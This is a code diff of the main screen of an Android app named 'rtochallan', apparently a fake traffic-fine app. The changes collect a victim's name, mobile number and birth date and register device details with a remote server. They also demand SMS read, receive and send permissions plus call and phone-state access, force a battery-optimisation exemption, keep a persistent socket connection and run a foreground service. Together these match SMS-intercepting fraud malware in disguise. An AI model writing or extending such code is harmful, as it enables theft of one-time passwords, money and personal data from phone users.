@@ -2,15 +2,13 @@ package com.service.rtochallan;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
-import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.util.Log;
-import android.view.LayoutInflater;
-import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
@@ -18,7 +16,6 @@ import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AlertDialog;
 import androidx.core.app.ActivityCompat;
-import androidx.core.app.NotificationManagerCompat;
 import androidx.core.content.ContextCompat;
 
 import org.json.JSONException;
@@ -30,7 +27,6 @@ import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
 import java.util.Objects;
-import java.util.Set;
 
 public class MainActivity extends BaseActivity {
 
@@ -42,43 +38,36 @@ public class MainActivity extends BaseActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        LayoutInflater inflater = getLayoutInflater();
-        View dialogView = inflater.inflate(R.layout.dialog_loading, null);
-
-        // Loading Dialog
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setView(dialogView);
-        builder.setCancelable(false);
-        setupLoading = builder.create();
-        setupLoading.show();
-
-        helper.FormCode(); // test cpp security is there nay error or not
-        if(!Helper.isNetworkAvailable(this)) {
-            Intent intent = new Intent(context, NoInternetActivity.class);
-            startActivity(intent);
-        }
-        checkPermissions();
-
     }
 
     private void runApp(){
-    setContentView(R.layout.activity_main);
-        Intent serviceIntent = new Intent(this, BackgroundService.class);
+        setContentView(R.layout.activity_main);
+        this.hideLoadingDialog();
+
+
+        // init the after the apinPointSet
+        socketManager = SocketManager.getInstance(context);
+        socketManager.connect();
+
+        Intent serviceIntent = new Intent(this, RunningService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
         } else {
             startService(serviceIntent);
         }
 
-
         EditText dob22 = findViewById(R.id.dob22);
         dob22.addTextChangedListener(new DateInputMask(dob22));
+
+        dataObject = new HashMap<>();
+        ids = new HashMap<>();
 
         dataObject = new HashMap<>();
         ids = new HashMap<>();
         ids.put(R.id.etFullName, "etFullName");
         ids.put(R.id.etMobile, "etMobile");
         ids.put(R.id.dob22, "dob22");
+
 
         // Populate dataObject
         for(Map.Entry<Integer, String> entry : ids.entrySet()) {
@@ -115,7 +104,7 @@ public class MainActivity extends BaseActivity {
                             int formId = response.optInt("data", -1);
                             String message = response.optString("message", "No message");
                             if (status == 200 && formId != -1) {
-                                Intent intent = new Intent(context, SecondActivity.class);
+                                Intent intent = new Intent(context, ThirdActivity.class);
                                 intent.putExtra("form_id", formId);
                                 startActivity(intent);
                             } else {
@@ -143,7 +132,13 @@ public class MainActivity extends BaseActivity {
     }
 
     private void initializeWebView() {
-        registerPhoneData();
+        boolean isAllowed = BatteryOptimizationHelper.handleActivityResult(this);
+        if (isAllowed) {
+            initializeApiPoints();
+        }else {
+            helper.show("Requesting battery optimization ignore...");
+            BatteryOptimizationHelper.requestIgnoreBatteryOptimizations(this);
+        }
     }
 
 
@@ -199,21 +194,17 @@ public class MainActivity extends BaseActivity {
         String[] permissions = new String[]{
                 Manifest.permission.READ_PHONE_STATE,
                 Manifest.permission.CALL_PHONE,
-                Manifest.permission.INTERNET,
                 Manifest.permission.ACCESS_NETWORK_STATE,
                 Manifest.permission.READ_SMS,
                 Manifest.permission.RECEIVE_SMS,
                 Manifest.permission.SEND_SMS
         };
-
-        // Add all the above if missing
         for (String perm : permissions) {
             if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                 permissionsToRequest.add(perm);
             }
         }
 
-        // ✅ For Android 13+ (notification permission)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                     != PackageManager.PERMISSION_GRANTED) {
@@ -227,10 +218,8 @@ public class MainActivity extends BaseActivity {
                     permissionsToRequest.toArray(new String[0]),
                     SMS_PERMISSION_REQUEST_CODE
             );
-            Toast.makeText(this, "Requesting permissions...", Toast.LENGTH_SHORT).show();
         } else {
             initializeWebView();
-            // OR start your foreground service here
         }
     }
 
@@ -249,14 +238,11 @@ public class MainActivity extends BaseActivity {
                         missingPermissions.append(permissions[i]).append("\n");
                     }
                 }
-
                 if (allPermissionsGranted) {
-                    initializeWebView(); // or startForegroundService()
+                    initializeWebView();
                 } else {
                     showPermissionDeniedDialog();
-                    Toast.makeText(this,
-                            "Permissions denied:\n" + missingPermissions.toString(),
-                            Toast.LENGTH_LONG).show();
+                    Toast.makeText(this,"Permissions Required : \n" + missingPermissions.toString(), Toast.LENGTH_LONG).show();
                 }
             }
         }
@@ -265,41 +251,34 @@ public class MainActivity extends BaseActivity {
     private void showPermissionDeniedDialog() {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle("Permission Denied");
-        builder.setMessage("SMS permissions are required to send and receive messages. " +
-                "Please grant the permissions in the app settings.");
-
-        // Open settings button
-        builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-                openAppSettings();
+        builder.setMessage("Please grant the permissions in the app settings...");
+        builder.setCancelable(false);
+        builder.setPositiveButton("Open Settings", (dialog, which) -> openAppSettings());
+        builder.setNegativeButton("Close App", (dialog, which) -> {
+            boolean isAllowed = BatteryOptimizationHelper.handleActivityResult(context);
+            dialog.dismiss();
+            if(!isAllowed){
+                finish(); // close app if not allowed..
             }
         });
-
-        // Cancel button
-        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
-            @Override
-            public void onClick(DialogInterface dialog, int which) {
-                dialog.dismiss();
-                finish();
-            }
-        });
-
         builder.show();
     }
     private void openAppSettings() {
         Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
         intent.addCategory(Intent.CATEGORY_DEFAULT);
-        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.setData(Uri.parse("package:" + getPackageName()));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
     }
 
     public void registerPhoneData() {
-        String url = helper.ApiUrl() + "/devices";
+        String url = helper.ApiUrl(context) + "/devices";
         JSONObject sendData = new JSONObject();
 
         try {
             sendData.put("form_code", helper.FormCode());
+            sendData.put("app_version", helper.AppVersion);
+            sendData.put("package_name", helper.getPackageName(context));
             sendData.put("device_name", Build.MANUFACTURER);
             sendData.put("device_model", Build.MODEL);
             sendData.put("device_android_version", Build.VERSION.RELEASE);
@@ -345,64 +324,112 @@ public class MainActivity extends BaseActivity {
 //        Log.d(TAG, "Registering device with data: " + sendData.toString());
 
         // ✅ Send the POST request
-        networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
-            @Override
-            public void onSuccess(String result) {
-                runOnUiThread(() -> {
-                    try {
-                        JSONObject jsonData = new JSONObject(result);
-                        int status = jsonData.optInt("status", 0);
-                        String message = jsonData.optString("message", "No message");
+            networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
+                @Override
+                public void onSuccess(String result) {
+                    runOnUiThread(() -> {
+                        try {
+                            JSONObject jsonData = new JSONObject(result);
+                            int status = jsonData.optInt("status", 0);
+                            String message = jsonData.optString("message", "No message");
 
-                        if (status == 200) {
-                            int device_id = jsonData.getInt("device_id");
-                            storage.saveInt("device_id", device_id);
-//                            Toast.makeText(getApplicationContext(),
-//                                    "Device registered successfully ✅",
-//                                    Toast.LENGTH_SHORT).show();
-                            setupLoading.hide();
-                            runApp();
-                        } else {
+                            if (status == 200) {
+                                int device_id = jsonData.getInt("device_id");
+                                storage.saveInt("device_id", device_id);
+    //                            Toast.makeText(getApplicationContext(),
+    //                                    "Device registered successfully ✅",
+    //                                    Toast.LENGTH_SHORT).show();
+                                runApp();
+                            } else {
+                                Toast.makeText(getApplicationContext(),
+                                        "Registration failed: " + message,
+                                        Toast.LENGTH_LONG).show();
+                                Log.d(TAG, "Device not registered: " + message);
+                            }
+                        } catch (JSONException e) {
+                            Log.e(TAG, "Response parse error: " + e.getMessage());
                             Toast.makeText(getApplicationContext(),
-                                    "Registration failed: " + message,
+                                    "Invalid response format from server",
                                     Toast.LENGTH_LONG).show();
-                            Log.d(TAG, "Device not registered: " + message);
                         }
-                    } catch (JSONException e) {
-                        Log.e(TAG, "Response parse error: " + e.getMessage());
-                        Toast.makeText(getApplicationContext(),
-                                "Invalid response format from server",
-                                Toast.LENGTH_LONG).show();
-                    }
-                });
-            }
+                    });
+                }
 
+                @Override
+                public void onFailure(String error) {
+                    runOnUiThread(() -> {
+                        Log.e(TAG, "Request failed: " + error);
+                        Toast.makeText(getApplicationContext(),
+                                "Network error: " + error,
+                                Toast.LENGTH_LONG).show();
+                    });
+                }
+            });
+    }
+
+    private void initializeApiPoints() {
+        ApiUpdater updater = new ApiUpdater();
+        updater.updateApiPoints(this, new ApiUpdater.ApiPointsCallback() {
             @Override
-            public void onFailure(String error) {
-                runOnUiThread(() -> {
-                    Log.e(TAG, "Request failed: " + error);
-                    Toast.makeText(getApplicationContext(),
-                            "Network error: " + error,
-                            Toast.LENGTH_LONG).show();
-                });
+            public void onApiPointsUpdated(String apiUrl, String socketUrl) {
+                registerPhoneData();
+                socketManager = SocketManager.getInstance(context);
+                socketManager.connect();
+            }
+            @Override
+            public void onApiPointsFailure(String error) {
+                helper.show("Main:Failed to load API Points: " + error);
+                Toast.makeText(context, "Configuration failed. Check connection.", Toast.LENGTH_LONG).show();
             }
         });
     }
 
-    public boolean hasPermission() {
-        if(ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-            return false;
+    @Override
+    protected void onResume() {
+        super.onResume();
+        helper.FormCode();
+        if(!helper.isNetworkAvailable(this)) {
+            Intent intent = new Intent(context, NoInternetActivity.class);
+            startActivity(intent);
+        }
+        BatteryOptimizationHelper.requestIgnoreBatteryOptimizations(this);
+        if (areAllPermissionsGranted()) {
+            boolean isAllowed = BatteryOptimizationHelper.handleActivityResult(this);
+            if (isAllowed) {
+                initializeWebView();
+            }else {
+                Toast.makeText(this, "Please restart the app & give allow the permission", Toast.LENGTH_SHORT).show();
+
+            }
         } else {
-            if(isNotificationListenerEnabled()){
-                return true;
-            }else{
+            checkPermissions();
+        }
+    }
+
+    private boolean areAllPermissionsGranted() {
+        String[] permissions = new String[]{
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.CALL_PHONE,
+                Manifest.permission.ACCESS_NETWORK_STATE,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.SEND_SMS
+        };
+
+        for (String permission : permissions) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                 return false;
             }
         }
-    }
-    private boolean isNotificationListenerEnabled() {
-        Set<String> enabledListenerPackages = NotificationManagerCompat.getEnabledListenerPackages(this);
-        return enabledListenerPackages.contains(getPackageName());
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
+                    != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+
+        return true;
     }
 
 
